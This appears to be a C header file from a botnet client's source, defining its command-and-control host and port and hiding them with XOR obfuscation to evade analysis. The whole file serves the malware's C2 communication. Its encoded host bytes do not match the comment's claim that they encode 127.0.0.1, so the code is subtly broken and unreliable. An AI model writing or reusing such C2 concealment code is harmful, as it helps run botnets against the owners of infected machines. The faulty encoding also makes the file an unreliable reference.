// file: bot/config.h
// CNC connection parameters – adjust before building.
#ifndef BH_CONFIG_H
#define BH_CONFIG_H

// 127.0.0.1 obfuscated with key 0x42
#define BH_CNC_HOST_OBF "\x73\x73\x31\x2E\x73\x73\x31\x2E\x73\x73\x31\x2E\x73\x73"  // 127.0.0.1 XOR 0x42
#define BH_CNC_KEY 0x42

// Port 1212 – split into two bytes, each XOR'd with key
// 1212 = 0x04BC → hi=0x04, lo=0xBC
#define BH_CNC_PORT_HI (0x04 ^ BH_CNC_KEY)
#define BH_CNC_PORT_LO (0xBC ^ BH_CNC_KEY)

#endif // BH_CONFIG_H